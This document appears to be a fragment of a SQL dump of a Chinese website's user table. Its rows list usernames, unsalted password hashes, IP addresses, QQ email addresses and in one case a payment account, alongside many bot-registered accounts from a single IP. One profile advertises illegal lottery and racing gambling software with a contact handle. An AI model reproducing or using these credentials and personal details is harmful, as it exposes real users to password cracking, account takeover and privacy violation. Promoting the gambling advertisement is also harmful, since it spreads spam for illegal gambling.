(239, 'cc336', 'f7c3bc1d808e04732adf679965ccc34ca7ae3441', '2019-04-03 09:38:40', '223.104.145.147', 400, 10, 'cc336', '', 0, 'cc336@qq.com', 0, '', NULL, '2014-10-15 00:00:00', '', 0, 0, NULL, NULL, NULL, NULL, 0, 1, 0, 0, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, 'f7c3bc1d808e04732adf679965ccc34ca7ae3441', 0, 0, 0, 0.8, NULL, NULL, 3, NULL, NULL, 0, NULL, NULL, NULL, 0, NULL, NULL, NULL, NULL, NULL, '', NULL, '', NULL, NULL, NULL, NULL, NULL, NULL),
(240, 'yangjie19891018', '6cbe3861d227fea9a161e295cbbea4063d241d22', '2019-04-05 18:29:34', '60.255.32.19', 1000, 10, '15632589', '', 0, '3504644805@qq.com', 0, '3504644805', NULL, '2019-04-08 22:34:27', '', 0, 0, NULL, NULL, NULL, NULL, 0, 1, 0, 0, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, '6cbe3861d227fea9a161e295cbbea4063d241d22', 0, 0, 0, 0.8, NULL, NULL, 3, NULL, NULL, 0, NULL, NULL, NULL, 0, NULL, NULL, NULL, NULL, NULL, '', NULL, '', NULL, NULL, NULL, '0629376001554460174', NULL, NULL),
(241, 'jixiesheji', 'c1809a0119a49d5f8650619f6f69917930f16828', '2019-04-11 18:08:28', '219.134.217.48', 400, 20, '机械设计', '', 0, '422932229@qq.com', 0, '422932229', NULL, '2019-10-25 10:54:24', '', 0, 55, '机械设计', '机械设计产品', '机械设计产品', NULL, 0, 1, 0, 2, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, 'c1809a0119a49d5f8650619f6f69917930f16828', 0, 0, 0, 0.8, NULL, NULL, 3, NULL, NULL, 0, NULL, NULL, NULL, 0, '2020-04-11 18:12:59', NULL, NULL, NULL, NULL, '', NULL, '', NULL, NULL, NULL, '0142940001554977309', NULL, NULL),
(242, '123567', '3d4f2bf07dc1be38b20cd6e46949a1071f9d0e3d', '2019-04-11 19:12:24', '223.104.9.214', 1000, 10, '123567', '', 0, '123567@qq.com', 0, '', NULL, '2014-10-15 00:00:00', '', 0, 0, NULL, NULL, NULL, NULL, 0, 1, 0, 0, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, '3d4f2bf07dc1be38b20cd6e46949a1071f9d0e3d', 0, 0, 0, 0.8, NULL, NULL, 3, NULL, NULL, 0, NULL, NULL, NULL, 0, NULL, NULL, NULL, NULL, NULL, '', NULL, '', NULL, NULL, NULL, NULL, NULL, NULL),
(243, 'qwe12300', '7b91fa95c2dd76fbeee75704ed33dfddf0fdec2d', '2019-04-13 11:47:54', '14.221.117.105', 1000, 10, 'qwe12300', '', 0, '6562621@qq.com', 0, '6562621', NULL, '2014-10-15 00:00:00', '', 0, 0, NULL, NULL, NULL, NULL, 0, 1, 0, 0, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, '7b91fa95c2dd76fbeee75704ed33dfddf0fdec2d', 0, 0, 0, 0.8, NULL, NULL, 3, NULL, NULL, 0, NULL, NULL, NULL, 0, NULL, NULL, NULL, NULL, NULL, '', NULL, '', NULL, NULL, NULL, '0897350001555127277', NULL, NULL),
(244, 'jikey58', '74c99b8afff2b2942762805b4c046e5e6d41b9f3', '2019-04-13 14:52:03', '36.37.140.92', 0, 10, 'jikey', '', 0, '3070745162@qq.com', 0, '3070745162', NULL, '2019-10-25 10:54:16', '', 0, 71, '新圣娱乐  vx：jikey58', '赛车源码飞艇pc蛋蛋加拿大28时时彩澳洲5，10 番摊 农场', '新圣娱乐 有意加v信：jikey58 北京赛车系统基于v信客户端开发，可自动获取v信用户的昵称和头像，识别会员身份，用户进去系统后无需注册，可直接扫码上下分参与游戏。有效防止拉手拉人，流失客户。支持v信，浏览器账号登陆，APP登陆', NULL, 0, 1, 0, 2, NULL, NULL, NULL, '024858', NULL, NULL, NULL, NULL, '74c99b8afff2b2942762805b4c046e5e6d41b9f3', 0, 0, 0, 0.8, NULL, NULL, 3, NULL, NULL, 0, NULL, NULL, NULL, 0, '2021-04-13 14:54:21', NULL, NULL, NULL, NULL, '', NULL, '', NULL, NULL, NULL, '0307461001555138323', NULL, NULL),
(897, 'vrpaTBfksXd3', 'adb778fc0796222c5bdb4988cc05ae1c0d315364', '2019-04-30 14:21:35', '115.194.38.239', 1000, 10, 'vrpaTBfksXd3', '', 0, '', 0, '', NULL, '2014-10-15 00:00:00', '', 0, 0, NULL, NULL, NULL, NULL, 0, 1, 0, 0, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, 'adb778fc0796222c5bdb4988cc05ae1c0d315364', 0, 0, 0, 0.8, NULL, NULL, 3, NULL, NULL, 0, NULL, NULL, NULL, 0, NULL, NULL, NULL, NULL, NULL, '', NULL, '', NULL, NULL, NULL, NULL, NULL, NULL),
(896, 'NnXC7ehtTCpW', '84087c662bb1f66c609ba679a6f8c09fa42d6b5e', '2019-04-30 14:21:35', '115.194.38.239', 1000, 10, 'NnXC7ehtTCpW', '', 0, '', 0, '', NULL, '2014-10-15 00:00:00', '', 0, 0, NULL, NULL, NULL, NULL, 0, 1, 0, 0, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, '84087c662bb1f66c609ba679a6f8c09fa42d6b5e', 0, 0, 0, 0.8, NULL, NULL, 3, NULL, NULL, 0, NULL, NULL, NULL, 0, NULL, NULL, NULL, NULL, NULL, '', NULL, '', NULL, NULL, NULL, NULL, NULL, NULL),
(895, 'Nyk34VtDXwCr', '74bd1723ae7037faf7b44af0fc627ea78588d758', '2019-04-30 14:21:35', '115.194.38.239', 1000, 10, 'Nyk34VtDXwCr', '', 0, '', 0, '', NULL, '2014-10-15 00:00:00', '', 0, 0, NULL, NULL, NULL, NULL, 0, 1, 0, 0, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, '74bd1723ae7037faf7b44af0fc627ea78588d758', 0, 0, 0, 0.8, NULL, NULL, 3, NULL, NULL, 0, NULL, NULL, NULL, 0, NULL, NULL, NULL, NULL, NULL, '', NULL, '', NULL, NULL, NULL, NULL, NULL, NULL),
(854, 'mUGNsUFZp7kG', '79b739fcbba856914c8b79db90e3bee123a3a794', '2019-04-30 14:21:34', '115.194.38.239', 1000, 10, 'mUGNsUFZp7kG', '', 0, '', 0, '', NULL, '2014-10-15 00:00:00', '', 0, 0, NULL, NULL, NULL, NULL, 0, 1, 0, 0, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, '79b739fcbba856914c8b79db90e3bee123a3a794', 0, 0, 0, 0.8, NULL, NULL, 3, NULL, NULL, 0, NULL, NULL, NULL, 0, NULL, NULL, NULL, NULL, NULL, '', NULL, '', NULL, NULL, NULL, NULL, NULL, NULL),
(853, '6tsKNYmv8PCP', '364410115e842676a36d5fe62ed80f188da7fb2d', '2019-04-30 14:21:34', '115.194.38.239', 1000, 10, '6tsKNYmv8PCP', '', 0, '', 0, '', NULL, '2014-10-15 00:00:00', '', 0, 0, NULL, NULL, NULL, NULL, 0, 1, 0, 0, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, '364410115e842676a36d5fe62ed80f188da7fb2d', 0, 0, 0, 0.8, NULL, NULL, 3, NULL, NULL, 0, NULL, NULL, NULL, 0, NULL, NULL, NULL, NULL, NULL, '', NULL, '', NULL, NULL, NULL, NULL, NULL, NULL),
(852, '2kaFXpcmEgVx', 'eada0768634ed0f389f7e40054ad2121b5720f6f', '2019-04-30 14:21:34', '115.194.38.239', 1000, 10, '2kaFXpcmEgVx', '', 0, '', 0, '', NULL, '2014-10-15 00:00:00', '', 0, 0, NULL, NULL, NULL, NULL, 0, 1, 0, 0, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, 'eada0768634ed0f389f7e40054ad2121b5720f6f', 0, 0, 0, 0.8, NULL, NULL, 3, NULL, NULL, 0, NULL, NULL, NULL, 0, NULL, NULL, NULL, NULL, NULL, '', NULL, '', NULL, NULL, NULL, NULL, NULL, NULL),
(851, 'MkCy7c2DCEyp', 'f2197facc337f112e8075a53027234181119efc5', '2019-04-30 14:21:34', '115.194.38.239', 1000, 10, 'MkCy7c2DCEyp', '', 0, '', 0, '', NULL, '2014-10-15 00:00:00', '', 0, 0, NULL, NULL, NULL, NULL, 0, 1, 0, 0, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, 'f2197facc337f112e8075a53027234181119efc5', 0, 0, 0, 0.8, NULL, NULL, 3, NULL, NULL, 0, NULL, NULL, NULL, 0, NULL, NULL, NULL, NULL, NULL, '', NULL, '', NULL, NULL, NULL, NULL, NULL, NULL),
(850, 'hupzSdt6YfFs', '49959542631a1f1e81572bb24e82ad9c2c395e08', '2019-04-30 14:21:34', '115.194.38.239', 1000, 10, 'hupzSdt6YfFs', '', 0, '', 0, '', NULL, '2014-10-15 00:00:00', '', 0, 0, NULL, NULL, NULL, NULL, 0, 1, 0, 0, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, '49959542631a1f1e81572bb24e82ad9c2c395e08', 0, 0, 0, 0.8, NULL, NULL, 3, NULL, NULL, 0, NULL, NULL, NULL, 0, NULL, NULL, NULL, NULL, NULL, '', NULL, '', NULL, NULL, NULL, NULL, NULL, NULL),
(849, 'lttg125', '7c4a8d09ca3762af61e59520943dc26494f8941b', '2019-04-29 00:39:14', '112.224.33.133', 900, 20, 'lttg125', '', 0, 'lttg125@qq.com', 0, '', NULL, '2019-10-25 10:53:47', '', 0, 41, '留记录', '就拉开了', '将尽快离开', NULL, 0, 1, 0, 2, NULL, NULL, NULL, NULL, '支付宝', '达富', '435456345345', '', '7c4a8d09ca3762af61e59520943dc26494f8941b', 0, 0, 0, 0.8, NULL, NULL, 3, NULL, NULL, 0, NULL, NULL, NULL, 0, '2020-04-29 00:40:46', NULL, NULL, NULL, NULL, '', NULL, '', NULL, NULL, NULL, '0854897001556470717', NULL, NULL),
(848, '8840496', '2e7a4ef24350790d981f554dc4383716ff3ede16', '2019-04-27 02:52:10', '171.37.28.16', 1000, 20, '8840496', '', 0, '8840496@qq.com', 0, '', NULL, '2014-10-15 00:00:00', '', 0, 0, NULL, NULL, NULL, NULL, 0, 1, 0, 0, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, '2e7a4ef24350790d981f554dc4383716ff3ede16', 0, 0, 0, 0.8, NULL, NULL, 3, NULL, NULL, 0, NULL, NULL, NULL, 0, NULL, NULL, NULL, NULL, NULL, '', NULL, '', NULL, NULL, NULL, NULL, NULL, NULL),
(847, 'caonidaye110', '424e99ee84d7021170c42a304c3eb40e6af4e2cd', '2019-04-25 10:49:37', '183.205.179.2', 600, 10, '兮兮', '', 0, '16787334@qq.com', 0, '', NULL, '2014-10-15 00:00:00', '', 0, 0, NULL, NULL, NULL, NULL, 0, 1, 0, 0, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, '424e99ee84d7021170c42a304c3eb40e6af4e2cd', 0, 0, 0, 0.8, NULL, NULL, 3, NULL, NULL, 0, NULL, NULL, NULL, 0, NULL, NULL, NULL, NULL, NULL, '', NULL, '', NULL, NULL, NULL, '0233121001556160581', NULL, NULL),
(846, 'cooklove', '7c4a8d09ca3762af61e59520943dc26494f8941b', '2019-04-24 17:30:30', '1.193.200.246', 1000, 10, 'cooklove', '', 0, 'cooklove@qq.com', 0, '', NULL, '2014-10-15 00:00:00', '', 0, 0, NULL, NULL, NULL, NULL, 0, 1, 0, 0, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, '7c4a8d09ca3762af61e59520943dc26494f8941b', 0, 0, 0, 0.8, NULL, NULL, 3, NULL, NULL, 0, NULL, NULL, NULL, 0, NULL, NULL, NULL, NULL, NULL, '', NULL, '', NULL, NULL, NULL, NULL, NULL, NULL),
(345, '86353838', '74cbb5fb2d6a9954b51c71d1fa0490090a4d8e50', '2019-04-20 14:16:07', '223.157.115.211', 1000, 10, '86353838', '', 0, '', 0, '', NULL, '2014-10-15 00:00:00', '', 0, 0, NULL, NULL, NULL, NULL, 0, 1, 0, 0, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, '74cbb5fb2d6a9954b51c71d1fa0490090a4d8e50', 0, 0, 0, 0.8, NULL, NULL, 3, NULL, NULL, 0, NULL, NULL, NULL, 0, NULL, NULL, NULL, NULL, NULL, '', NULL, '', NULL, NULL, NULL, NULL, NULL, NULL),
(945, 'u23A3wCC8dbN', 'd56285ec415f6040c70bd7d0814268a57aa5ba83', '2019-04-30 14:21:35', '115.194.38.239', 1000, 10, 'u23A3wCC8dbN', '', 0, '', 0, '', NULL, '2014-10-15 00:00:00', '', 0, 0, NULL, NULL, NULL, NULL, 0, 1, 0, 0, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, 'd56285ec415f6040c70bd7d0814268a57aa5ba83', 0, 0, 0, 0.8, NULL, NULL, 3, NULL, NULL, 0, NULL, NULL, NULL, 0, NULL, NULL, NULL, NULL, NULL, '', NULL, '', NULL, NULL, NULL, NULL, NULL, NULL),
(944, 'bn5Cfa9zKtN3', '6ec4e27e00edd5e8d5d234fb3b2ff22aeaf09350', '2019-04-30 14:21:35', '115.194.38.239', 1000, 10, 'bn5Cfa9zKtN3', '', 0, '', 0, '', NULL, '2014-10-15 00:00:00', '', 0, 0, NULL, NULL, NULL, NULL, 0, 1, 0, 0, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, '6ec4e27e00edd5e8d5d234fb3b2ff22aeaf09350', 0, 0, 0, 0.8, NULL, NULL, 3, NULL, NULL, 0, NULL, NULL, NULL, 0, NULL, NULL, NULL, NULL, NULL, '', NULL, '', NULL, NULL, NULL, NULL, NULL, NULL),
(943, 't96SuGDR9a8D', 'f1cce9d5019a9032081fc217d2efb589a715701f', '2019-04-30 14:21:35', '115.194.38.239', 1000, 10, 't96SuGDR9a8D', '', 0, '', 0, '', NULL, '2014-10-15 00:00:00', '', 0, 0, NULL, NULL, NULL, NULL, 0, 1, 0, 0, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, 'f1cce9d5019a9032081fc217d2efb589a715701f', 0, 0, 0, 0.8, NULL, NULL, 3, NULL, NULL, 0, NULL, NULL, NULL, 0, NULL, NULL, NULL, NULL, NULL, '', NULL, '', NULL, NULL, NULL, NULL, NULL, NULL),
(942, 'vX8NSTun4kPB', 'c3b1fc5bc1a6c6cbf034e771256a68a63389cba5', '2019-04-30 14:21:35', '115.194.38.239', 1000, 10, 'vX8NSTun4kPB', '', 0, '', 0, '', NULL, '2014-10-15 00:00:00', '', 0, 0, NULL, NULL, NULL, NULL, 0, 1, 0, 0, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, 'c3b1fc5bc1a6c6cbf034e771256a68a63389cba5', 0, 0, 0, 0.8, NULL, NULL, 3, NULL, NULL, 0, NULL, NULL, NULL, 0, NULL, NULL, NULL, NULL, NULL, '', NULL, '', NULL, NULL, NULL, NULL, NULL, NULL),
(941, 'Hh6wCd8z9bN4', '28b45ce91692e746a98e918babce31bd1464290f', '2019-04-30 14:21:35', '115.194.38.239', 1000, 10, 'Hh6wCd8z9bN4', '', 0, '', 0, '', NULL, '2014-10-15 00:00:00', '', 0, 0, NULL, NULL, NULL, NULL, 0, 1, 0, 0, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, '28b45ce91692e746a98e918babce31bd1464290f', 0, 0, 0, 0.8, NULL, NULL, 3, NULL, NULL, 0, NULL, NULL, NULL, 0, NULL, NULL, NULL, NULL, NULL, '', NULL, '', NULL, NULL, NULL, NULL, NULL, NULL),
(940, 'eFn6urHUXCzg', '6ab93123429569889f5750b5c885e1fa9d4125e7', '2019-04-30 14:21:35', '115.194.38.239', 1000, 10, 'eFn6urHUXCzg', '', 0, '', 0, '', NULL, '2014-10-15 00:00:00', '', 0, 0, NULL, NULL, NULL, NULL, 0, 1, 0, 0, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, '6ab93123429569889f5750b5c885e1fa9d4125e7', 0, 0, 0, 0.8, NULL, NULL, 3, NULL, NULL, 0, NULL, NULL, NULL, 0, NULL, NULL, NULL, NULL, NULL, '', NULL, '', NULL, NULL, NULL, NULL, NULL, NULL),
(939, 'wCWEpSr8HvmS', '4bb95457ffce78b3c842bf3f7d9179922c454cc3', '2019-04-30 14:21:35', '115.194.38.239', 1000, 10, 'wCWEpSr8HvmS', '', 0, '', 0, '', NULL, '2014-10-15 00:00:00', '', 0, 0, NULL, NULL, NULL, NULL, 0, 1, 0, 0, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, '4bb95457ffce78b3c842bf3f7d9179922c454cc3', 0, 0, 0, 0.8, NULL, NULL, 3, NULL, NULL, 0, NULL, NULL, NULL, 0, NULL, NULL, NULL, NULL, NULL, '', NULL, '', NULL, NULL, NULL, NULL, NULL, NULL),
(938, 'SCznraGMNGCM', 'd5c6b29e7bc0bec8703dbcb0bca1b0dff39f2339', '2019-04-30 14:21:35', '115.194.38.239', 1000, 10, 'SCznraGMNGCM', '', 0, '', 0, '', NULL, '2014-10-15 00:00:00', '', 0, 0, NULL, NULL, NULL, NULL, 0, 1, 0, 0, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, 'd5c6b29e7bc0bec8703dbcb0bca1b0dff39f2339', 0, 0, 0, 0.8, NULL, NULL, 3, NULL, NULL, 0, NULL, NULL, NULL, 0, NULL, NULL, NULL, NULL, NULL, '', NULL, '', NULL, NULL, NULL, NULL, NULL, NULL),
(937, 'dFFxdXBA8hBu', 'b9eb5094ed0dcdd886c4939da4f8c1b5d1ff48c0', '2019-04-30 14:21:35', '115.194.38.239', 1000, 10, 'dFFxdXBA8hBu', '', 0, '', 0, '', NULL, '2014-10-15 00:00:00', '', 0, 0, NULL, NULL, NULL, NULL, 0, 1, 0, 0, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, 'b9eb5094ed0dcdd886c4939da4f8c1b5d1ff48c0', 0, 0, 0, 0.8, NULL, NULL, 3, NULL, NULL, 0, NULL, NULL, NULL, 0, NULL, NULL, NULL, NULL, NULL, '', NULL, '', NULL, NULL, NULL, NULL, NULL, NULL),
(936, 'AUSGrG76BxUX', '60bf00246388300551a801cd554c8ad6177c971b', '2019-04-30 14:21:35', '115.194.38.239', 1000, 10, 'AUSGrG76BxUX', '', 0, '', 0, '', NULL, '2014-10-15 00:00:00', '', 0, 0, NULL, NULL, NULL, NULL, 0, 1, 0, 0, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, '60bf00246388300551a801cd554c8ad6177c971b', 0, 0, 0, 0.8, NULL, NULL, 3, NULL, NULL, 0, NULL, NULL, NULL, 0, NULL, NULL, NULL, NULL, NULL, '', NULL, '', NULL, NULL, NULL, NULL, NULL, NULL),
(935, 'Ge9FYN7Auurs', '21ae7d3409eb44d975d0c02ec957d84cfd82958e', '2019-04-30 14:21:35', '115.194.38.239', 1000, 10, 'Ge9FYN7Auurs', '', 0, '', 0, '', NULL, '2014-10-15 00:00:00', '', 0, 0, NULL, NULL, NULL, NULL, 0, 1, 0, 0, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, '21ae7d3409eb44d975d0c02ec957d84cfd82958e', 0, 0, 0, 0.8, NULL, NULL, 3, NULL, NULL, 0, NULL, NULL, NULL, 0, NULL, NULL, NULL, NULL, NULL, '', NULL, '', NULL, NULL, NULL, NULL, NULL, NULL),
(934, 'XmbnN7WbTUmS', 'df22ce7801b634d5f5a47536adc92e62ee8764e5', '2019-04-30 14:21:35', '115.194.38.239', 1000, 10, 'XmbnN7WbTUmS', '', 0, '', 0, '', NULL, '2014-10-15 00:00:00', '', 0, 0, NULL, NULL, NULL, NULL, 0, 1, 0, 0, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, 'df22ce7801b634d5f5a47536adc92e62ee8764e5', 0, 0, 0, 0.8, NULL, NULL, 3, NULL, NULL, 0, NULL, NULL, NULL, 0, NULL, NULL, NULL, NULL, NULL, '', NULL, '', NULL, NULL, NULL, NULL, NULL, NULL),
(933, '9BHEdWbHDExT', '7373c13954ae31c4ec90725c6227e6f2c06c293c', '2019-04-30 14:21:35', '115.194.38.239', 1000, 10, '9BHEdWbHDExT', '', 0, '', 0, '', NULL, '2014-10-15 00:00:00', '', 0, 0, NULL, NULL, NULL, NULL, 0, 1, 0, 0, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, '7373c13954ae31c4ec90725c6227e6f2c06c293c', 0, 0, 0, 0.8, NULL, NULL, 3, NULL, NULL, 0, NULL, NULL, NULL, 0, NULL, NULL, NULL, NULL, NULL, '', NULL, '', NULL, NULL, NULL, NULL, NULL, NULL),
(932, '44Av6E6zR7H4', 'abf9990b70f5ae5243dddd999946bb4a7a9dd4b4', '2019-04-30 14:21:35', '115.194.38.239', 1000, 10, '44Av6E6zR7H4', '', 0, '', 0, '', NULL, '2014-10-15 00:00:00', '', 0, 0, NULL, NULL, NULL, NULL, 0, 1, 0, 0, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, 'abf9990b70f5ae5243dddd999946bb4a7a9dd4b4', 0, 0, 0, 0.8, NULL, NULL, 3, NULL, NULL, 0, NULL, NULL, NULL, 0, NULL, NULL, NULL, NULL, NULL, '', NULL, '', NULL, NULL, NULL, NULL, NULL, NULL),
(931, 'g82bW6PPuCn6', '84bd56ff1092588fe536a97bef0446f7e60bc0d1', '2019-04-30 14:21:35', '115.194.38.239', 1000, 10, 'g82bW6PPuCn6', '', 0, '', 0, '', NULL, '2014-10-15 00:00:00', '', 0, 0, NULL, NULL, NULL, NULL, 0, 1, 0, 0, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, '84bd56ff1092588fe536a97bef0446f7e60bc0d1', 0, 0, 0, 0.8, NULL, NULL, 3, NULL, NULL, 0, NULL, NULL, NULL, 0, NULL, NULL, NULL, NULL, NULL, '', NULL, '', NULL, NULL, NULL, NULL, NULL, NULL),
(930, 'atdH36GXCGM8', 'dd0a66a86fe4bdc61d8a3d27b0f17629e7099a0d', '2019-04-30 14:21:35', '115.194.38.239', 1000, 10, 'atdH36GXCGM8', '', 0, '', 0, '', NULL, '2014-10-15 00:00:00', '', 0, 0, NULL, NULL, NULL, NULL, 0, 1, 0, 0, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, 'dd0a66a86fe4bdc61d8a3d27b0f17629e7099a0d', 0, 0, 0, 0.8, NULL, NULL, 3, NULL, NULL, 0, NULL, NULL, NULL, 0, NULL, NULL, NULL, NULL, NULL, '', NULL, '', NULL, NULL, NULL, NULL, NULL, NULL),
(929, 'WkNRDhZtbKPh', '77c5daa2116d51434b11e27ace912c3316e4aded', '2019-04-30 14:21:35', '115.194.38.239', 1000, 10, 'WkNRDhZtbKPh', '', 0, '', 0, '', NULL, '2014-10-15 00:00:00', '', 0, 0, NULL, NULL, NULL, NULL, 0, 1, 0, 0, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, '77c5daa2116d51434b11e27ace912c3316e4aded', 0, 0, 0, 0.8, NULL, NULL, 3, NULL, NULL, 0, NULL, NULL, NULL, 0, NULL, NULL, NULL, NULL, NULL, '', NULL, '', NULL, NULL, NULL, NULL, NULL, NULL),
(928, 'gaDm2aCZgXr8', 'f66b62b4fb5f97220dd09fa0a6a3a337ede63f20', '2019-04-30 14:21:35', '115.194.38.239', 1000, 10, 'gaDm2aCZgXr8', '', 0, '', 0, '', NULL, '2014-10-15 00:00:00', '', 0, 0, NULL, NULL, NULL, NULL, 0, 1, 0, 0, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, 'f66b62b4fb5f97220dd09fa0a6a3a337ede63f20', 0, 0, 0, 0.8, NULL, NULL, 3, NULL, NULL, 0, NULL, NULL, NULL, 0, NULL, NULL, NULL, NULL, NULL, '', NULL, '', NULL, NULL, NULL, NULL, NULL, NULL),
(927, 'a4KsK2suX8ay', '1c201a5b14820ed9938882852a0e30f6d3099313', '2019-04-30 14:21:35', '115.194.38.239', 1000, 10, 'a4KsK2suX8ay', '', 0, '', 0, '', NULL, '2014-10-15 00:00:00', '', 0, 0, NULL, NULL, NULL, NULL, 0, 1, 0, 0, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, '1c201a5b14820ed9938882852a0e30f6d3099313', 0, 0, 0, 0.8, NULL, NULL, 3, NULL, NULL, 0, NULL, NULL, NULL, 0, NULL, NULL, NULL, NULL, NULL, '', NULL, '', NULL, NULL, NULL, NULL, NULL, NULL),
(926, 'r86cgBKaSmdK', '78d51ed029f539c08f18b6ea5bd2ee335e9a7760', '2019-04-30 14:21:35', '115.194.38.239', 1000, 10, 'r86cgBKaSmdK', '', 0, '', 0, '', NULL, '2014-10-15 00:00:00', '', 0, 0, NULL, NULL, NULL, NULL, 0, 1, 0, 0, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, '78d51ed029f539c08f18b6ea5bd2ee335e9a7760', 0, 0, 0, 0.8, NULL, NULL, 3, NULL, NULL, 0, NULL, NULL, NULL, 0, NULL, NULL, NULL, NULL, NULL, '', NULL, '', NULL, NULL, NULL, NULL, NULL, NULL),
(925, 'rFrGmDf7abdy', 'e611d9280a7d1049cf56e44e6531be70ec9a7f7a', '2019-04-30 14:21:35', '115.194.38.239', 1000, 10, 'rFrGmDf7abdy', '', 0, '', 0, '', NULL, '2014-10-15 00:00:00', '', 0, 0, NULL, NULL, NULL, NULL, 0, 1, 0, 0, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, 'e611d9280a7d1049cf56e44e6531be70ec9a7f7a', 0, 0, 0, 0.8, NULL, NULL, 3, NULL, NULL, 0, NULL, NULL, NULL, 0, NULL, NULL, NULL, NULL, NULL, '', NULL, '', NULL, NULL, NULL, NULL, NULL, NULL),
(924, '8RCsdUSgEF2K', '6844d5e4d4c5dbcbdef37d5cd657b737973a7292', '2019-04-30 14:21:35', '115.194.38.239', 1000, 10, '8RCsdUSgEF2K', '', 0, '', 0, '', NULL, '2014-10-15 00:00:00', '', 0, 0, NULL, NULL, NULL, NULL, 0, 1, 0, 0, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, '6844d5e4d4c5dbcbdef37d5cd657b737973a7292', 0, 0, 0, 0.8, NULL, NULL, 3, NULL, NULL, 0, NULL, NULL, NULL, 0, NULL, NULL, NULL, NULL, NULL, '', NULL, '', NULL, NULL, NULL, NULL, NULL, NULL),
(923, 'PFw36kK5vBgM', '776bb7a329f9ced410d4ca3225b46ecd70dc53a6', '2019-04-30 14:21:35', '115.194.38.239', 1000, 10, 'PFw36kK5vBgM', '', 0, '', 0, '', NULL, '2014-10-15 00:00:00', '', 0, 0, NULL, NULL, NULL, NULL, 0, 1, 0, 0, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, '776bb7a329f9ced410d4ca3225b46ecd70dc53a6', 0, 0, 0, 0.8, NULL, NULL, 3, NULL, NULL, 0, NULL, NULL, NULL, 0, NULL, NULL, NULL, NULL, NULL, '', NULL, '', NULL, NULL, NULL, NULL, NULL, NULL),
(922, 'gewVg8zWDyhG', 'f9232a76e4a3f7f4375843fafa20f10d9aeab662', '2019-04-30 14:21:35', '115.194.38.239', 1000, 10, 'gewVg8zWDyhG', '', 0, '', 0, '', NULL, '2014-10-15 00:00:00', '', 0, 0, NULL, NULL, NULL, NULL, 0, 1, 0, 0, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, 'f9232a76e4a3f7f4375843fafa20f10d9aeab662', 0, 0, 0, 0.8, NULL, NULL, 3, NULL, NULL, 0, NULL, NULL, NULL, 0, NULL, NULL, NULL, NULL, NULL, '', NULL, '', NULL, NULL, NULL, NULL, NULL, NULL),
(921, 'xbCSAyNnxe97', '39b3dce91f15f5fb613e3c1f6d1fe848ff291961', '2019-04-30 14:21:35', '115.194.38.239', 1000, 10, 'xbCSAyNnxe97', '', 0, '', 0, '', NULL, '2014-10-15 00:00:00', '', 0, 0, NULL, NULL, NULL, NULL, 0, 1, 0, 0, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, '39b3dce91f15f5fb613e3c1f6d1fe848ff291961', 0, 0, 0, 0.8, NULL, NULL, 3, NULL, NULL, 0, NULL, NULL, NULL, 0, NULL, NULL, NULL, NULL, NULL, '', NULL, '', NULL, NULL, NULL, NULL, NULL, NULL),
(920, 'YmxYTfW8ZwxF', '3527b545863f5f249ddb3bbaf9aef0c2f8d31d01', '2019-04-30 14:21:35', '115.194.38.239', 1000, 10, 'YmxYTfW8ZwxF', '', 0, '', 0, '', NULL, '2014-10-15 00:00:00', '', 0, 0, NULL, NULL, NULL, NULL, 0, 1, 0, 0, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, '3527b545863f5f249ddb3bbaf9aef0c2f8d31d01', 0, 0, 0, 0.8, NULL, NULL, 3, NULL, NULL, 0, NULL, NULL, NULL, 0, NULL, NULL, NULL, NULL, NULL, '', NULL, '', NULL, NULL, NULL, NULL, NULL, NULL),
(919, 'bgd6GDcPnRCS', '8f50c2c40d9127898c14bc23946b3ab25a0abf8c', '2019-04-30 14:21:35', '115.194.38.239', 1000, 10, 'bgd6GDcPnRCS', '', 0, '', 0, '', NULL, '2014-10-15 00:00:00', '', 0, 0, NULL, NULL, NULL, NULL, 0, 1, 0, 0, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, '8f50c2c40d9127898c14bc23946b3ab25a0abf8c', 0, 0, 0, 0.8, NULL, NULL, 3, NULL, NULL, 0, NULL, NULL, NULL, 0, NULL, NULL, NULL, NULL, NULL, '', NULL, '', NULL, NULL, NULL, NULL, NULL, NULL),
